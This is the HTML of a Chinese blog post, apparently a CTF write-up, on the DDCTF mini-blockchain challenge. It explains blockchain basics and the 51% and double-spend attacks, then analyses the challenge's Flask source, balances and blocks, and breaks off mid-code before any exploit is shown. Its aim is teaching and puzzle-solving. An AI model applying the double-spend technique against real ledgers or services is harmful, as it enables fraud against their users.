@@ -1,0 +1,2933 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        DDCTF-bitcoin-51%Attack · Sky&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">DDCTF-bitcoin-51%Attack</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sky's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            DDCTF-bitcoin-51%Attack
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = web>web</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/22</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近结束的ddctf中mini blockchain一题与最近热门的区块链紧密挂钩<br>紧接着XCTF联赛的国际比赛starctf同样出现了一道与区块链相关的题目<br>于是我只能紧随潮流，来研究并且学习一波未知领域的知识。<br>首先放出参考链接，膜一波大佬们<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.8btc.com/51attack</span><br><span class="line">http://www.lz1y.cn/archives/1372.html</span><br><span class="line">http://hebic.me/2018/04/20/DDCTF2018-mini-blockchain-writeup/</span><br></pre></td></tr></table></figure></p>
+<p>并且感谢研究区块链课题的同学kxz的ppt资料参考<br>当然，由于技术拙劣，难免出现错误，望各位更正。</p>
+<h2 id="区块链与比特币基础学习"><a href="#区块链与比特币基础学习" class="headerlink" title="区块链与比特币基础学习"></a>区块链与比特币基础学习</h2><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>区块链的概念首次在2008年末由中本聪（Satoshi Nakamoto）发表在比特币论坛中的论文《Bitcoin: A Peer-to-Peer Electronic Cash System》提出。<br>论文中区块链技术是构建比特币数据结构与交易信息加密传输的基础技术，该技术实现了比特币的挖矿与交易。<br>区块链是一种支持比特币运行的底层技术。<br>2009年1月3日，中本聪在位于芬兰赫尔辛基的一个小型服务器上挖出了比特币的第一个区块——创世区块（Genesis Block），并获得了首批“挖矿”奖励——50个比特币。</p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>区块链是一种去中心化的分布式数据库<br>Google上的定义是:<br>区块链（Blockchain）是指通过去中心化和去信任的方式集体维护一个可靠数据库的技术方案。<br>该技术方案让参与系统中的任意多个节点，把一段时间系统内全部信息交流的数据，通过密码学算法计算记录到一个数据块（block），并且生成该数据块的指纹用于链接（chain）下个数据块和校验，系统所有参与节点来共同认定记录是否为真。<br>1.去中心化：<br>即无中央管理机构，没有管理员。每个人都可以向区块中写数据，这就避免了一些大公司垄断的可能性。<br>2.分布式：<br>每个人都可以架设服务器成为区块链的一个节点<br>3.数据库：<br>区块链是存储数据的</p>
+<h3 id="区块链的特点"><a href="#区块链的特点" class="headerlink" title="区块链的特点"></a>区块链的特点</h3><p>1、去中心化<br>由于使用分布式核算和存储，不存在中心化的硬件或管理机构，任意节点的权利和义务都是均等的，系统中的数据块由整个系统中具有维护功能的节点来共同维护。<br>得益于区块链的去中心化特征，比特币也拥有去中心化的特征 。</p>
+<p>2、开放性<br>系统是开放的，除了交易各方的私有信息被加密外，区块链的数据对所有人公开，任何人都可以通过公开的接口查询区块链数据和开发相关应用，因此整个系统信息高度透明。</p>
+<p>3、自治性<br>区块链采用基于协商一致的规范和协议（比如一套公开透明的算法）使得整个系统中的所有节点能够在去信任的环境自由安全的交换数据，使得对“人”的信任改成了对机器的信任，任何人为的干预不起作用。</p>
+<p>4、不可篡改<br>一旦信息经过验证并添加至区块链，就会永久的存储起来，除非能够同时控制住系统中超过51%的节点，否则单个节点上对数据库的修改是无效的，因此区块链的数据稳定性和可靠性极高。</p>
+<p>5、匿名性<br>由于节点之间的交换遵循固定的算法，其数据交互是无需信任的（区块链中的程序规则会自行判断活动是否有效），因此交易对手无须通过公开身份的方式让对方自己产生信任，对信用的累积非常有帮助。</p>
+<h3 id="区块链的结构"><a href="#区块链的结构" class="headerlink" title="区块链的结构"></a>区块链的结构</h3><p>比特币是目前区块链技术最广泛的应用，可以通过比特币作为实例了解区块链的结构。<br>但比特币并不是区块链，区块链是一种技术、平台。比特币只是区块链的一个应用。<br>区块链是由许多区块组成的链，每个区块由区块头和数据组成。<br>区块头里有32字节的父区块哈希值，父区块的哈希值由区块头各个字段的值连在一起经哈希函数（sha256）运算后得到的哈希值，这样区块便链接在一起。<br>如果某一区块发生改变，那么之后的区块都必须改变，当区块足够多时，计算量是非常大的。在100个区块以后，区块链已经足够稳定。几千个区块（一个月）后的区块 链将变成确定的历史，永远不会改变。这也保证的区块链的安全性。<br>比特币没有中心机构，几乎所有的完整节点都有一份公共总帐的备份，这份总帐可以被视为认证过的记录。区块链并不是由一个中心机构创造的，它 是由比特币网络中的所有节点各自独立竞争完成的。<br>结构图：<br><img src="/images/bitcoin (5).png"><br>区块头：<br><img src="/images/bitcoin (6).png"> </p>
+<h3 id="挖矿与比特币"><a href="#挖矿与比特币" class="headerlink" title="挖矿与比特币"></a>挖矿与比特币</h3><p>想要生产下一个区块，必须计算出当前最新区块的区块头的哈希值。计算哈希值的过程便是挖矿。<br>但计算出的哈希值要小于目标值,即target。<br>target=targetmax/difficulty<br>其中targetmax=0x00000000FFFF0000000000000000000000000000000000000000000000000000<br>difficulty即区块头中的难度目标，difficulty动态变化，控制难度，使一个新区块的产生周期为10mins<br>矿工通过遍历Nonce的值，来寻找合适的哈希值。所以也说挖矿掺杂运气成分。<br>Nonce一共32位，所以最大计算次数可以到21.47亿。</p>
+<p>每个区块中的第一个交易是特殊的: 它为第一个采到有效区块的人创建新的比特币。</p>
+<p>开始时为2009年1月每个区块奖励50个比特币，然后到2012年11月减 半为每个区块奖励25个比特币。之后将在2016年的某个时刻再次减半为每个新区块奖励12.5个比特币。基于这个公 式，比特币挖矿奖励以指数方式递减，直到2140年。届时所有的比特币（20,999,999,980）全部发行完毕。换句话说 在2140年之后，不会再有新的比特币产生。<br>每笔交易都可能包含一笔交易费，在2140年之后，所有的矿工收益都将由交易费构成。</p>
+<p>挖矿主要方式是矿池挖矿，独立挖矿的风险过于庞大，几乎不可能。通过工作量证明(Nonce)分配收成。</p>
+<h3 id="区块链分叉问题"><a href="#区块链分叉问题" class="headerlink" title="区块链分叉问题"></a>区块链分叉问题</h3><p>如果两个矿工同时算出哈希值，由于距离远近，不同的矿工看到这两个区块是有先后顺序的。通常情况下，矿工们会把自己先看到的区块复制过来，然后接着在这个区块开始新的挖矿工作。于是就出现了两个区块链：<br><img src="/images/bitcoin (1).jpg"><br>但由于算力不同，最终会有一条区块链比较长，当矿工发现全网有一条更长的链时，他就会抛弃他当前的链，把新的更长的链全部复制回来，在这条链的基础上继续挖矿。所有矿工都这样操作，这条链就成为了主链，分叉出来被抛弃掉的链就消失了。<br><img src="/images/bitcoin (2).jpg"> </p>
+<h2 id="区块链攻击"><a href="#区块链攻击" class="headerlink" title="区块链攻击"></a>区块链攻击</h2><p>区块链存在多种攻击形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">51%攻击</span><br><span class="line">扣块攻击</span><br><span class="line">双重花费攻击</span><br><span class="line">自私采矿攻击</span><br><span class="line">日蚀攻击</span><br></pre></td></tr></table></figure></p>
+<p>因为本次题目主要涉及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">51%攻击</span><br><span class="line">双重花费攻击</span><br></pre></td></tr></table></figure></p>
+<p>所以我仅在本篇文章中分析这2个攻击点<br>(其实二者为一，相辅相成)<br>所谓51%攻击即攻击者掌握了比特币全网的51%算力之后，用这些算力来重新计算已经确认过的区块，使块链产生分叉并且获得利益的行为。<br>这里就涉及到之前区块链分叉的问题了<br>还是以之前的图片为例<br><img src="/images/bitcoin (1).jpg"><br>我们假设主链为<br>1(黄)-2(黄)-3(黄)-4(蓝)-5(蓝)<br>此时<br>4(蓝)-5(蓝)<br>为已计算确认过的区块<br>而攻击者拥有51%的算力，没有任何用户可以超越他的计算速度<br>于是他从区块3(黄)开始重新计算<br>伪造生成区块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4(黄)-5(黄)-6(黄)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/bitcoin (2).jpg"><br>导致之前本已确认的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4(蓝)-5(蓝)</span><br></pre></td></tr></table></figure></p>
+<p>作废,使攻击达成<br>这样的攻击获利方式也很简单。其实也就是双重花费攻击(后称双花攻击)<br>我们结合DDCTF这道题目来了解一下</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>个人认为分析flask代码首要还是查看路由<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + '/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + '/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + '/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + '/create_transaction', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + '/reset')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + '/source_code')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></span><br></pre></td></tr></table></figure></p>
+<p>路由大致如上<br>我们从homepage入手，不难发现题目的背景<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + '/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    announcement = <span class="string">'Announcement: The server has been restarted at 21:45 04/22. All blockchain have been reset. '</span></span><br><span class="line">    balance, utxos, _ = get_balance_of_all()</span><br><span class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</span><br><span class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</span><br><span class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</span><br><span class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</span><br><span class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> announcement + (<span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join(</span><br><span class="line">        [view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))</span><br></pre></td></tr></table></figure></p>
+<p>我们访问这个路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.107:5000/b942f830cf97e/</span><br></pre></td></tr></table></figure></p>
+<p>发现目前存在3个地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">the bank&apos;s addr: b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985</span><br><span class="line"></span><br><span class="line">the hacker&apos;s addr: 955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131</span><br><span class="line"></span><br><span class="line">the shop&apos;s addr: b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735</span><br></pre></td></tr></table></figure></p>
+<p>然后关注到每个账户的资金<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Balance of all addresses: &#123;&quot;b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985&quot;: 1, &quot;b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735&quot;: 0, &quot;955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131&quot;: 999999&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hacker:999999</span><br><span class="line">bank:1</span><br><span class="line">shop:0</span><br></pre></td></tr></table></figure></p>
+<p>然后关注到输入与输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">All utxos: </span><br><span class="line">&#123;</span><br><span class="line">&quot;07efd7c6-9331-4bc5-9284-3270c2e6b4c1&quot;: </span><br><span class="line">&#123;</span><br><span class="line">&quot;amount&quot;: 1, &quot;hash&quot;: &quot;79da1a4388dc5c8a108ed8e46a03be5afe9c9354d663197898fb9a1c9706ffb8&quot;, </span><br><span class="line">&quot;addr&quot;: &quot;b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985&quot;, </span><br><span class="line">&quot;id&quot;: &quot;07efd7c6-9331-4bc5-9284-3270c2e6b4c1&quot;&#125;,</span><br><span class="line"></span><br><span class="line">&quot;f7e645d3-80dc-4211-a144-16bb65e0ce9d&quot;:</span><br><span class="line">&#123;</span><br><span class="line">&quot;amount&quot;: 999999, </span><br><span class="line">&quot;hash&quot;: &quot;e1177f4ad17602c1e97778eafb0be9f713788d0eb6c0a1f6a094058ac3b8f40d&quot;, </span><br><span class="line">&quot;addr&quot;: &quot;955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131&quot;,</span><br><span class="line">&quot;id&quot;: &quot;f7e645d3-80dc-4211-a144-16bb65e0ce9d&quot;</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>以及区块情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;d4b81acf2228fc10744a9a26c01d38a5ad93fc1050493027d9c34ceb0b2e8ab5&quot;: </span><br><span class="line">&#123;</span><br><span class="line">&quot;nonce&quot;: &quot;a empty block&quot;,</span><br><span class="line">&quot;prev&quot;: &quot;60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d&quot;,</span><br><span class="line">&quot;hash&quot;: &quot;d4b81acf2228fc10744a9a26c01d38a5ad93fc1050493027d9c34ceb0b2e8ab5&quot;,</span><br><span class="line">&quot;transactions&quot;: [],</span><br><span class="line">&quot;height&quot;: 2</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&quot;10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7&quot;: </span><br><span class="line">&#123;</span><br><span class="line">&quot;nonce&quot;: &quot;The Times 03/Jan/2009 Chancellor on brink of second bailout for bank&quot;,</span><br><span class="line">&quot;prev&quot;: &quot;0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">&quot;hash&quot;: &quot;10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7&quot;,</span><br><span class="line">&quot;transactions&quot;: [&#123;&quot;input&quot;: [],</span><br><span class="line">&quot;signature&quot;: [],</span><br><span class="line">&quot;hash&quot;: &quot;3babd7fb07e2ad96f824eb2ed39adced4560fadeef92f194f8d51711285f4dab&quot;,</span><br><span class="line">&quot;output&quot;: [&#123;&quot;amount&quot;: 1000000,</span><br><span class="line">&quot;hash&quot;: &quot;65019b18f48817c9bf7897bf616c0e72eb88370d60c0a2647fc8fb30b9b4dcfb&quot;,</span><br><span class="line">&quot;addr&quot;: &quot;b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985&quot;,</span><br><span class="line">&quot;id&quot;: &quot;be4f2b71-f371-446b-be0d-b268352e8adf&quot;&#125;]&#125;],</span><br><span class="line">&quot;height&quot;: 0&#125;,</span><br><span class="line"></span><br><span class="line">&quot;60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d&quot;: </span><br><span class="line">&#123;</span><br><span class="line">&quot;nonce&quot;: &quot;HAHA, I AM THE BANK NOW!&quot;,</span><br><span class="line">&quot;prev&quot;: &quot;10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7&quot;,</span><br><span class="line">&quot;hash&quot;: &quot;60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d&quot;,</span><br><span class="line">&quot;transactions&quot;: [&#123;&quot;input&quot;: [&quot;be4f2b71-f371-446b-be0d-b268352e8adf&quot;],</span><br><span class="line">&quot;signature&quot;: [&quot;585f3e49f71d97c5a014fd0947e9049fea260796ef65aa6d5ec46bb5bc1ccfb410741da1c1bff8e970ac3149fea6817c&quot;],</span><br><span class="line">&quot;hash&quot;: &quot;75da7f7eb267f1203fcc3e34347b2d109160a9836e140d3f500be8d6904bdfd5&quot;,</span><br><span class="line">&quot;output&quot;: [&#123;&quot;amount&quot;: 999999,</span><br><span class="line">&quot;hash&quot;: &quot;e1177f4ad17602c1e97778eafb0be9f713788d0eb6c0a1f6a094058ac3b8f40d&quot;,</span><br><span class="line">&quot;addr&quot;: &quot;955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131&quot;,</span><br><span class="line">&quot;id&quot;: &quot;f7e645d3-80dc-4211-a144-16bb65e0ce9d&quot;&#125;,</span><br><span class="line">&#123;&quot;amount&quot;: 1,</span><br><span class="line">&quot;hash&quot;: &quot;79da1a4388dc5c8a108ed8e46a03be5afe9c9354d663197898fb9a1c9706ffb8&quot;,</span><br><span class="line">&quot;addr&quot;: &quot;b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985&quot;,</span><br><span class="line">&quot;id&quot;: &quot;07efd7c6-9331-4bc5-9284-3270c2e6b4c1&quot;&#125;]&#125;],</span><br><span class="line">&quot;height&quot;: 1&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以知道<br>第一个区块：创世区块<br>向银行地址发放DDB为1000000<br>第二个区块：黑客添加区块<br>让银行账户向黑客账户转账999999 DDB<br>第三个区块：空区块<br>然后我们查看getflag的方式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + '/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(</span><br><span class="line">        session[<span class="string">'your_diamonds'</span>]) + shop_address</span><br></pre></td></tr></table></figure></p>
+<p>题目要求我们的钻石数大于等于2,即可返回flag<br>我们去查看如何获得钻石,定位到<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + '/create_transaction', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">'transaction finished.'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line"></span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[shop_address] == <span 